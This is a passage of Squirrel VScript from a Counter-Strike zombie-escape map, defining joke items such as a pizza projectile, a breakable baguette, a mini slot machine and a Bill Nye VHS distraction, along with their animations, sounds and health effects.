										EntFireByHandle(self,"Disable","",0.15,null,null);
										EntFireByHandle(self,"Kill","",0.20,null,null);
											//EntFireByHandle(self,"RunScriptCode",
											//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
											//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,1.00); ",0.01,null,null);
									}});
								*/	
									
									
									
									
									
									
									
									
							},function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle_spawn",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle_spawn",0.02,null,null);
								EntFireByHandle(self,"RunScriptCode","Tick();",0.05,null,null);
							}});
					}
					else if(event==2)//pickup
					{
						EntFireByHandle(model,"SetAnimation","idle",0.00,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","idle",0.01,null,null);
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+cooldown_side;
						if(user.GetHealth()<=::ITEMS.dragonslayer.hp_use_limit)
						{
							button.GetScriptScope().cooldown = 0.40;
							::Sound("*luffaren/sliced.mp3",Vector(0,0,20),button,5000,0.35,RandomInt(40,50),10);
							::Sound("*luffaren/whip_me_daddy.mp3",Vector(0,0,20),button,1000,0.35,RandomInt(60,70),4);
							EntFireByHandle(model,"AddOutput","modelscale 1.50",0.00,null,null);
							EntFireByHandle(model,"AddOutput","modelscale 1.80",0.20,null,null);
							return;
						}
						local hploss = 0.00;
						local hploss_delay = 0.30;
						local scalereset_delay = 0.20;
						if(user.GetVelocity().z > -::ITEMS.dragonslayer.downslash_vel)				//swipe left/right
						{
							model.GetScriptScope().idleanim_buffer = ::ITEMS.dragonslayer.animreset_time;
							EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.dragonslayer.slowdown_swipe.tostring()+","+::ITEMS.dragonslayer.slowtime_swipe.tostring()+"); ",0.20,user);
							hploss = (0.00+::ITEMS.dragonslayer.selfhurt_swipe);
							animstate++;
							if(animstate>2)animstate=1;
							local veldir = "+";
							local anim = "R";
							if(animstate==1){		anim="L";		veldir="-";		}
							EntFireByHandle(user,"RunScriptCode","self.SetVelocity(self.GetVelocity()"+veldir+"(self.GetLeftVector()*200));",0.20,null,null);
							EntFireByHandle(model,"SetAnimation","swing_"+anim,0.00,null,null);
							EntFireByHandle(model,"SetAnimation","idle_"+anim,0.40,null,null);
							EntFireByHandle(model,"SetDefaultAnimation","idle_"+anim,0.41,null,null);
							EntFireByHandle(model,"SetPlaybackRate","0.1",0.01,null,null);
							EntFireByHandle(model,"SetPlaybackRate","0.1",0.03,null,null);
							EntFireByHandle(model,"SetPlaybackRate","2.5",0.20,null,null);
							EntFireByHandle(model,"RunScriptCode","HitCheck();",0.16,null,null);
							local ii = 0.25;
							if(::ITEMS.dragonslayer.fx_trail){
							if(animstate==1)for(local ang = -80;ang<80;ang+=10){EntFireByHandle(model,"RunScriptCode","TrailFX("+ang.tostring()+");",ii,null,null);ii += 0.01;}
							else for(local ang = 80;ang> -80;ang-=10){EntFireByHandle(model,"RunScriptCode","TrailFX("+ang.tostring()+");",ii,null,null);ii += 0.01;}}
						}
						else																		//downward-slash
						{
							button.GetScriptScope().cooldown = 0.00+cooldown_down;
							model.GetScriptScope().idleanim_buffer = -9999.00;
							hploss_delay = 0.07;
							hploss = (0.00+::ITEMS.dragonslayer.selfhurt_downslash);
							for(local ii=0.00;ii<0.15;ii+=0.01)
								EntFireByHandle(user,"RunScriptCode","if(self.GetVelocity().z> -500)self.SetVelocity(Vector(0,0,-500));",ii,null,null);
							EntFire("manager","RunScriptCode"," AddSpeed(2.00,0.10); ",0.00,user);
							::Process([{qrate=0.30,function Run(){}},{user=user,function Run(){
									if(user.GetVelocity().z > -300)
										EntFire("manager","RunScriptCode"," AddSpeed("+::ITEMS.dragonslayer.slowdown_downslash.tostring()+
											","+::ITEMS.dragonslayer.slowtime_downslash.tostring()+"); ",0.00,user);
								}}],0.05);
							EntFireByHandle(model,"SetAnimation","swing_down",0.00,null,null);
							EntFireByHandle(model,"SetDefaultAnimation","idle",0.02,null,null);
							EntFireByHandle(model,"SetPlaybackRate","0.01",0.01,null,null);
							EntFireByHandle(model,"SetPlaybackRate","0.01",0.02,null,null);
							EntFireByHandle(model,"SetPlaybackRate","0.01",0.03,null,null);
							EntFireByHandle(model,"SetPlaybackRate","0.5",0.15,null,null);
							EntFireByHandle(model,"SetPlaybackRate","1.0",1.00,null,null);
							EntFireByHandle(model,"RunScriptCode","HitCheck(false);",0.05,null,null);
							scalereset_delay = 0.60;
							::Sound("*luffaren/clang.mp3",Vector(200,0,0),button,5000,0.40,RandomInt(40,45),10);
							::Sound("*luffaren/clang.mp3",Vector(200,0,0),button,5000,0.40,RandomInt(110,120),10);
							local pq = [{qrate=0.15,function Run(){}}];
							pq.push({button=button,function Run(){
								::Particle("blood_spurt_synth_01",button.GetOrigin()+(button.GetForwardVector()*200)+Vector(0,0,-40),Vector(),null,0.10);
								::Particle("blood_impact_synth_01_droplets",button.GetOrigin()+(button.GetForwardVector()*200)+Vector(0,0,-40),Vector(),null,0.10);
								::Particle("burning_engine_01",button.GetOrigin()+(button.GetForwardVector()*200)+Vector(0,0,-40),Vector(),null,0.10);
								::Particle("smoke_exhaust_01",button.GetOrigin()+(button.GetForwardVector()*200)+Vector(0,0,-40),Vector(),null,0.10);
										//copter_takeoff_1_dust_low  ^
							}});
							::Process(pq,0.05);
							local ii = 0.05;
							if(::ITEMS.dragonslayer.fx_trail)
								for(local ang = -70;ang<20;ang+=5){EntFireByHandle(model,"RunScriptCode","TrailFX("+ang.tostring()+",true);",ii,null,null);ii += 0.01;}
						}
						::Process([{qrate=hploss_delay,function Run(){}},{hploss=hploss,user=user,function Run(){
								local newhp = user.GetHealth()-hploss;
								if(newhp<=::ITEMS.dragonslayer.hp_use_limit)newhp=(0+::ITEMS.dragonslayer.hp_use_limit);
								if(newhp<=0)EntFireByHandle(user,"SetHealth","-1",0.00,null,null);
								else EntFireByHandle(user,"AddOutput","health "+newhp.tostring(),0.00,null,null);
							}}],0.05);
						local ii = 0.14;
						local tscale = 2.50;
						for(local mscale=1.80;mscale<tscale;mscale+=0.10)
						{
							EntFireByHandle(model,"AddOutput","modelscale "+mscale.tostring(),ii,null,null);
							ii += 0.01;
						}
						EntFireByHandle(model,"AddOutput","modelscale "+tscale.tostring(),ii,null,null);
						ii += scalereset_delay;
						for(local mscale=tscale;mscale>1.80;mscale-=0.10)
						{
							EntFireByHandle(model,"AddOutput","modelscale "+mscale.tostring(),ii,null,null);
							ii += 0.01;
						}
						EntFireByHandle(model,"AddOutput","modelscale 1.80",ii,null,null);
						::Sound("*luffaren/whip_me_daddy.mp3",Vector(100,0,0),button,5000,0.35,RandomInt(40,50),4);
						::Sound("*luffaren/clang.mp3",Vector(200,0,0),button,5000,0.35,RandomInt(60,65),10);
						if(firestate>0.00)::Sound("*weapons/molotov/fire_ignite_5.wav",Vector(200,0,0),button,5000,0.35,RandomInt(70,90),10);
					}
				}},hammerid);
		}
	},
	pizzabaker = {
			team = 2,
			hammerid = 29,	//example: 1 (range 1-999)
			trigger_width = 20,		
			trigger_depth = 20,		//__CSS__ og was 1, but OBB triggers are fucked in css..
			modelscale = 3.80,
			modelscale_glow = 3.75,
			glow_color = "255 0 0",
			sound_stack = 3,
			song_volume = 5,
			song_pitch = 150,
			song_radius = 30000,
			movespeed = 200,
			lifetime = 25.00,
			cooldown = 10.00,
			uses = 3,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"PizzaBaker","("+cooldown+"s|"+uses.tostring()+"x)\n"+
					"Spawns a pizza-projectile in your look-direction\nIt instakills humans on-touch\nIt goes through walls",{
				cooldown = cooldown,
				model=null,
				uses = (0+uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/pizza.mdl");
						::Ent(button.GetOrigin()+(button.GetForwardVector()*2)+Vector(0,0,-35),button.GetAngles()+Vector(0,0,0),"prop_dynamic",{
								model="models/luffaren/pizza.mdl",
								modelscale = 2.20,
								rendermode = 3,
								rendercolor = "255 255 255",
								renderamt = 255,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0",0.00,null,null);
						::EyeTrace(user,{function Run(player,dir,rot){
								::ITEMS.pizzabaker.SpawnPizzaBakerPizza(player.EyePosition(),rot,dir,player);
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function SpawnPizzaBakerPizza(pos,rot,dir,user=null)
		{
			//::manager.PrecacheModel("models/luffaren/pizza.mdl");
			::Ent(pos,rot+Vector(90,0,0),"prop_dynamic",{
					model="models/luffaren/pizza.mdl",
					modelscale = (0.00+::ITEMS.pizzabaker.modelscale),
					rendermode = 3,
					body = 1,
					rendercolor = "255 200 150",
					renderamt = 255,
				},{
				dir = dir,
				user = user,
				function Run(){
					//EntFireByHandle(self,"Skin","1",2.00,null,null);
					::Sound("*luffaren/spork.mp3",Vector(),self,10000,2.00,RandomInt(30,35),10);
					::Sound("*luffaren/spork.mp3",Vector(),self,30000,8.00,RandomInt(8,8),10);
					::Ent(self.GetOrigin()-(dir*10),self.GetAngles(),"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_ct",
						},{
						master = self,
						user = user,
						currenthits = 0,
						function Tick(){
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
							EntFireByHandle(self,"Disable","",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
						},function Touch(){
							local toucher = activator;	//__CSS__ activator may get reset, store toucher
							::ServerSay("say ***THE PIZZA IS AGGRESSIVE***",1.55,null);
							::HurtPlayer(toucher,999999,self.GetOrigin(),RandomInt(200,400),user,"pizzabaker");
							local randpitch = RandomInt(95,105);
							for(local i=0;i<::ITEMS.pizzabaker.sound_stack;i++){
								::Sound("*luffaren/pizza_aggressive.mp3",self.GetOrigin()+Vector(0,0,8),null,10000,0.10,randpitch,100);
								::Sound("*luffaren/pizza_splotion.mp3",self.GetOrigin()+Vector(0,0,8),null,30000,0.10,randpitch,100);}
							::Particle("blood_advisor_puncture_withdraw",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
							::Particle("muzzle_rifles",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
						},function Run(){
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							local w = ::ITEMS.pizzabaker.trigger_width.tostring();
							local d = ::ITEMS.pizzabaker.trigger_depth.tostring();
							EntFireByHandle(self,"AddOutput","mins -"+w+" -"+w+" -"+d+"",0.00,null,null);
							EntFireByHandle(self,"AddOutput","maxs "+w+" "+w+" "+d+"",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
								//EntFireByHandle(self,"RunScriptCode",
								//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
								//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
						}});
					local mmrot = ::DirToAngles(dir);
					local mrot = ""+mmrot.x.tostring()+" "+mmrot.y.tostring()+" "+mmrot.z.tostring();
					::Ent(self.GetOrigin(),Vector(),"func_movelinear",{
							movedir = mrot,
							movedistance = 20000,
							speed = (0+::ITEMS.pizzabaker.movespeed),
							blockdamage = 999999,
							spawnflags = 8,
							targetname = "i_pizzabakerpizza",
						},{
						master = self,
						sound = null,
						function CleanSelf(){
							EntFireByHandle(self,"Kill","",0.15,null,null);
							EntFireByHandle(sound,"StopSound","",0.00,null,null);
							EntFireByHandle(sound,"Volume","0",0.00,null,null);
							EntFireByHandle(sound,"Kill","",0.08,null,null);
						},function Run(){
							EntFireByHandle(master,"SetParent","!activator",0.00,self,null);
							EntFireByHandle(self,"Open","",0.02,null,null);
							EntFireByHandle(self,"RunScriptCode","CleanSelf();",::ITEMS.pizzabaker.lifetime,null,null);
							::Sound("*luffaren/pizzadoom.mp3",Vector(),self,::ITEMS.pizzabaker.song_radius,::ITEMS.pizzabaker.lifetime+2.00,
								::ITEMS.pizzabaker.song_pitch,::ITEMS.pizzabaker.song_volume,{master=self,function Run(){master.GetScriptScope().sound=soundhandle}});
						}});
					for(local i=0;i<2;i++)
					{
						local rotofs = 0;
						if(i==0)rotofs = 180;
						::Ent(self.GetOrigin(),self.GetAngles()+Vector(rotofs,0,0),"prop_dynamic",{
								model="models/luffaren/pizza.mdl",
								modelscale = (0.00+::ITEMS.pizzabaker.modelscale_glow),
								rendermode = 1,
								renderamt = 0,
								glowenabled = 1,
								glowdist = 20000,
								glowstyle = 0,
								glowcolor = ""+::ITEMS.pizzabaker.glow_color,
							},{
							master = self,
							function Run(){
								EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							}});
					}
				}});
		},
	},
	baguette = {
			team = 3,
			hammerid = 28,	//example: 1 (range 1-999)
			cooldown = 0.27,
			hitdamage = 300,
			hitvel_xy = 500,
			hitvel_z = 300,
			breakchance_base = -2.50,			//the breakchance to start with
			breakchance_stack = 0.10,			//how much to += the breakchance for each zombie that's hit
			breakchance_stack_nohit = 0.50,		//how much to += the breakchance for each swing that hit no zombies at all
			bosshit = [300,5000,5.00,1.00],		//radius,damage,stunchance,stuntime_add
			watercrystal_range = 400,
			watercrystal_chance_set = -15.00,
			fx_limit = 5,
		fxamt = 0,
		function Spawn(pos){
			
			
			
			::CreateItem(pos,Vector(),1,"Baguette","(0s)\nPush zombies back with wide swings"+
					"\nThe baguette may break on each swing by chance:"+
					"\n(+"+breakchance_stack.tostring()+"% each hit)"+
					" | (+"+breakchance_stack_nohit.tostring()+"% each miss)"+
					"\nWaterCrystal resets chance to "+watercrystal_chance_set.tostring()+"%\nCan hurt/stun boss",{
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			::CreateItem(pos,Vector(),1,"Baguette","(0s)\nHold zombies back with wide swings\n"+
					"The swings hurts+pushes zombies (and hurts itself)\nThe baguette eventually breaks by too much damage"+
					"\n(break-chance stacks by +"+breakchance_stack.tostring()+"% for each swing-hit)"+
					"\n(break-chance stacks by +"+breakchance_stack_nohit.tostring()+"% for each swing-miss)"+
					"\nA watercrystal can set the break-chance to "+watercrystal_chance_set.tostring()+"%\nCan hurt/stun boss",{
			*/	
				
				
				cooldown = cooldown,
				model=null,
				animstate = 0,
				breakchance = (0.00+breakchance_base),
				broken = false,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/baguette.mdl");
						::Ent(button.GetOrigin()-(button.GetForwardVector()*5)+Vector(0,0,-30),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/baguette.mdl",
								rendermode = 1,
								modelscale = 0.70,
								glowenabled = 0,
								glowdist = 2000,
								glowstyle = 1,
								glowcolor = "100 50 0",
							},{
							button = button,
							logic = this,
							function Break(){
								EntFireByHandle(self,"AddOutput","body 1",0.00,null,null);
								::Sound("*luffaren/fart_reverb.mp3",Vector(),button,5000,0.05,RandomInt(40,45),10);
								::Sound("*luffaren/sliced.mp3",Vector(),button,5000,0.05,RandomInt(80,90),10);
								::Sound("*luffaren/pizza_splotion.mp3",Vector(),button,5000,0.05,RandomInt(245,255),10);
								::ServerSay("say Oh no the baguette broke!",0.00,null);
							},function SlapFX(ang){
								local pos = self.GetOrigin()+(::AnglesToDir(::DirToAngles(self.GetForwardVector())+Vector(0,ang,0))*320);
								::Particle("blood_spurt_synth_01",pos,Vector(),null,0.03);
							},function Slap(){
								if(logic.broken)return;
								::HurtStunBoss(self.GetOrigin()+(self.GetForwardVector()*200),
									::ITEMS.baguette.bosshit[0],::ITEMS.baguette.bosshit[1],::ITEMS.baguette.bosshit[2],::ITEMS.baguette.bosshit[3],null);
								
								
								//__CSS__ OOB trigger rotation is fucked (replacement logic):
								::TriggerScan(self.GetOrigin(),self.GetAngles(),Vector(-10,-130,-20),Vector(320,130,20),
									"filter_non_invincible_t",{
									hit_success = 0,
									button = button,
									model = self,
									logic=logic,
									function PostCheck(){
										if(logic.broken)return;
										if(RandomFloat(0.00,100.00)<=logic.breakchance)
										{
											logic.broken = true;
											button.GetScriptScope().cooldown = null;
											EntFireByHandle(model,"RunScriptCode","Break();",0.22,null,null);
											//EntFireByHandle(model,"fadeandkill","2",7.00,null,null);
											::FadeAndKill(model,2.00,7.00);		//__CSS__ fadeandkill doesn't exist in css
											EntFireByHandle(button,"Kill","",10.00,null,null);
										}
										if(hit_success > 0)logic.breakchance += (hit_success*::ITEMS.baguette.breakchance_stack);
										else logic.breakchance += ::ITEMS.baguette.breakchance_stack_nohit;
									},function Scanned(list){
										this.PostCheck();
										foreach(h in list)
										{
											h.ValidateScriptScope();
											if("invincible" in h.GetScriptScope())return;
											hit_success++;
											local zvel = h.GetVelocity().z;
											if(zvel < 30)zvel = (0.00+::ITEMS.baguette.hitvel_z);
											h.SetVelocity((button.GetForwardVector()*::ITEMS.baguette.hitvel_xy)+Vector(0,0,zvel));
											local newhp = (h.GetHealth()-(::ITEMS.baguette.hitdamage * ::HURTPLAYER_mult_t));
											if(newhp <= 0)::HurtPlayer(h,999999,button.GetOrigin(),RandomInt(200,400),button.GetMoveParent().GetMoveParent(),"baguette");
											else h.SetHealth(newhp);
											if(::ITEMS.baguette.fxamt>::ITEMS.baguette.fx_limit)return;
											::ITEMS.baguette.fxamt++;
											EntFire("manager","RunScriptCode"," ::ITEMS.baguette.fxamt--; ",0.05,null);
											::Sound("*luffaren/punch.mp3",h.GetOrigin()+Vector(0,0,40),null,1000,0.02,RandomInt(120,200),10);
											::Particle("muzzle_rifles",h.GetOrigin()+Vector(0,0,40),Vector(90+RandomInt(-15,15),
												RandomInt(0,360),RandomInt(-15,15)),null,0.03);
										}
									}},false);
								
								
								//__CSS__ OOB trigger rotation is fucked (old logic, borked):
								/*
								::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
										spawnflags = 1,
										filtername = "filter_non_invincible_t",
									},{
									hit_success = 0,
									button = button,
									model = self,
									logic = logic,
									function PostCheck(){
										if(logic.broken)return;
										if(RandomFloat(0.00,100.00)<=logic.breakchance)
										{
											logic.broken = true;
											button.GetScriptScope().cooldown = null;
											EntFireByHandle(model,"RunScriptCode","Break();",0.22,null,null);
											//EntFireByHandle(model,"fadeandkill","2",7.00,null,null);
											::FadeAndKill(model,2.00,7.00);		//__CSS__ fadeandkill doesn't exist in css
											EntFireByHandle(button,"Kill","",10.00,null,null);
										}
										if(hit_success > 0)logic.breakchance += (hit_success*::ITEMS.baguette.breakchance_stack);
										else logic.breakchance += ::ITEMS.baguette.breakchance_stack_nohit;
									},function Touch(){
										local toucher = activator;	//__CSS__ activator may get reset, store toucher
										if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
										toucher.ValidateScriptScope();
										if("invincible" in toucher.GetScriptScope())return;
										hit_success++;
										local zvel = toucher.GetVelocity().z;
										if(zvel < 30)zvel = (0.00+::ITEMS.baguette.hitvel_z);
										toucher.SetVelocity((self.GetForwardVector()*::ITEMS.baguette.hitvel_xy)+Vector(0,0,zvel));
										local newhp = toucher.GetHealth()-::ITEMS.baguette.hitdamage;
										if(newhp <= 0)::HurtPlayer(toucher,999999,self.GetOrigin(),RandomInt(200,400),button.GetMoveParent().GetMoveParent(),"baguette");
										else toucher.SetHealth(newhp);
										if(::ITEMS.baguette.fxamt>::ITEMS.baguette.fx_limit)return;
										::ITEMS.baguette.fxamt++;
										EntFire("manager","RunScriptCode"," ::ITEMS.baguette.fxamt--; ",0.05,null);
										::Sound("*luffaren/punch.mp3",toucher.GetOrigin()+Vector(0,0,40),null,1000,0.02,RandomInt(120,200),10);
										::Particle("muzzle_rifles",toucher.GetOrigin()+Vector(0,0,40),Vector(90+RandomInt(-15,15),
											RandomInt(0,360),RandomInt(-15,15)),null,0.03);
									},function Run(){
										//EntFireByHandle(self,"AddOutput","mins -10 -130 -20",0.00,null,null);
										//EntFireByHandle(self,"AddOutput","maxs 320 130 20",0.00,null,null);
										//		//__CSS__ new below, old above
										self.SetSize(	Vector(-10,-130,-20),
														Vector(320,130,20));
										::NetProps.SetPropInt(self,"m_CollisionGroup",0);
										self.SetSolid(3);
										//self.AcceptInput("Enable","",null,null);
										//self.AcceptInput("SetParent","!activator",this.button,null);
										
										::DrawBounds(self);
										
										//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"Enable","",0.02,null,null);
										EntFireByHandle(self,"Disable","",0.15,null,null);
										EntFireByHandle(self,"Kill","",0.20,null,null);
										EntFireByHandle(self,"RunScriptCode","PostCheck();",0.17,null,null);
											//EntFireByHandle(self,"RunScriptCode",
											//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
											//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,1.00); ",0.01,null,null);
									}});
								*/
								
								
							},function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+cooldown;
						animstate++;
						if(animstate>2)animstate=1;
						EntFireByHandle(model,"SetAnimation","swing_"+animstate.tostring(),0.00,null,null);
						EntFireByHandle(model,"SetPlaybackRate","0.1",0.01,null,null);
						EntFireByHandle(model,"SetPlaybackRate","0.1",0.03,null,null);
						EntFireByHandle(model,"SetPlaybackRate","1.5",0.20,null,null);
						EntFireByHandle(model,"RunScriptCode","Slap();",0.22,null,null);
						EntFireByHandle(model,"AddOutput","glowenabled 1",0.22,null,null);
						EntFireByHandle(model,"AddOutput","glowenabled 0",0.32,null,null);
						local ii = 0.14;
						for(local mscale=0.70;mscale<1.50;mscale+=0.10)
						{
							EntFireByHandle(model,"AddOutput","modelscale "+mscale.tostring(),ii,null,null);
							ii += 0.01;
						}
						EntFireByHandle(model,"AddOutput","modelscale 1.50",ii,null,null);
						ii += 0.10;
						for(local mscale=1.50;mscale>0.70;mscale-=0.10)
						{
							EntFireByHandle(model,"AddOutput","modelscale "+mscale.tostring(),ii,null,null);
							ii += 0.01;
						}
						ii = 0.20;
						if(animstate==1)
							for(local ang = -70;ang<70;ang+=20){EntFireByHandle(model,"RunScriptCode","SlapFX("+ang.tostring()+");",ii,null,null);ii += 0.02;}
						else
							for(local ang = 70;ang> -70;ang-=20){EntFireByHandle(model,"RunScriptCode","SlapFX("+ang.tostring()+");",ii,null,null);ii += 0.02;}
						EntFireByHandle(model,"AddOutput","modelscale 0.70",ii,null,null);
						::Sound("*luffaren/whip_me_daddy.mp3",Vector(),button,5000,0.05,RandomInt(40,50),4);
						::Sound("*luffaren/fart_reverb.mp3",Vector(),button,5000,0.05,RandomInt(80,90),10);
						return true;
					}
				}},hammerid);
		}
	},
	minislots = {
			team = 3,
			hammerid = 27,	//example: 1 (range 1-999)
			cooldown = 1.00,
			win_chance = 5.00,
			win_hp = 42,
			lose_hp = 7,
		function Spawn(pos){
			::CreateItem(pos,Vector(),1,"MiniSlots","("+cooldown+"s)\nA portable slotmachine to gamble on-the-go\n"+
					"Win chance: "+win_chance.tostring()+"%\nLose: lose "+lose_hp.tostring()+"hp\nWin: gain "+win_hp.tostring()+"hp",{
				cooldown = cooldown,
				model=null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/slotmachine_mini.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-40),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/slotmachine_mini.mdl",
								rendermode = 1,
								rendercolor = "150 255 200",
								modelscale = 3.20,
								solid = 0,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","lose",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","lose",0.02,null,null);
								EntFireByHandle(self,"AddOutput","effects 16384",0.00,null,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+cooldown;
						EntFireByHandle(model,"SetAnimation","spin",0.00,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","spin",0.02,null,null);
						EntFireByHandle(model,"SetPlaybackRate","11.00",0.03,null,null);
						::Sound("*luffaren/slotmachine_roll.mp3",Vector(0,0,0),button,1000,0.80,RandomInt(120,125),10);
						local rolldelay = 0.80;
						local anim = "lose";
						local snd = "*luffaren/slotmachine_debuff.mp3";
						if(RandomFloat(0.00,100.00) <= ::ITEMS.minislots.win_chance)
						{
							anim = "win";
							snd = "*luffaren/slotmachine_reward.mp3";
							EntFireByHandle(user,"RunScriptCode",
								"EntFireByHandle(self,\"AddOutput\",\"health \"+(self.GetHealth()+::ITEMS.minislots.win_hp).tostring(),0.00,null,null);",
								rolldelay+0.00,null,null);
						}
						else
						{
							
							EntFireByHandle(user,"RunScriptCode",
								"EntFireByHandle(self,\"SetHealth\",(self.GetHealth()-::ITEMS.minislots.lose_hp).tostring(),0.00,null,null);",
								rolldelay+0.00,null,null);
						}
						EntFireByHandle(button,"RunScriptCode","::Sound(\""+snd+"\",Vector(),self,1000,0.80,RandomInt(120,125),10);",rolldelay+0.00,null,null);
						EntFireByHandle(model,"SetAnimation",anim,rolldelay+0.00,null,null);
						EntFireByHandle(model,"SetDefaultAnimation",anim,rolldelay+0.02,null,null);
						return true;
					}
				}},hammerid);
		}
	},
	billnye = {
			team = 3,
			hammerid = 26,	//example: 1 (range 1-999)
			tickrate = 0.20,
			playtime = 14.00,
			soundstack = 2,
			soundrange = 10000,
			scan_range = 500,
			scan_only_front = true,		//set to 'false' to ignore zombies behind the tv
			start_delay = 1.00,			//on-spawn, when to turn on the TV
			start_tickdelay = 1.90,		//on-TV-turnon, when to start ticking the scan/force-look tick
			cleantime = 10.00,			//when done playing, wait for this time before 5s fadeout/kill
			bosshit = [500,100,80.00,8.00],			//radius,damage,stunchance,stuntime_add
		function Spawn(pos){
			::CreateItem(pos,Vector(),1,"BillNye","(1x)\nShow nearby zombies a Bill Nye VHS\nKeep class distracted while you laze off"+
				"\nTheir attention gets drawn to the TV\nIt lasts for "+playtime.tostring()+"s\nCan stun boss",{
				model = null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/billnye_vhs.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35),Vector(0,0,0),"prop_dynamic",{
								model="models/luffaren/billnye_vhs.mdl",
								modelscale = 0.60,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"AddOutput","body 0",0.00,null,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						local spos = user.GetOrigin()+Vector(0,0,1);
						spos = spos+(user.GetForwardVector()*(15*TraceLinePlayersIncluded(spos,spos+(user.GetForwardVector()*15),user)));
						local downtrace = TraceLinePlayersIncluded(spos,spos-(user.GetUpVector()*40),user);
						if(downtrace ==1.00)return false;
						spos = spos-(user.GetUpVector()*(40*downtrace));
						spos = spos+Vector(0,0,RandomFloat(-3,0));
						button.GetScriptScope().cooldown = null;
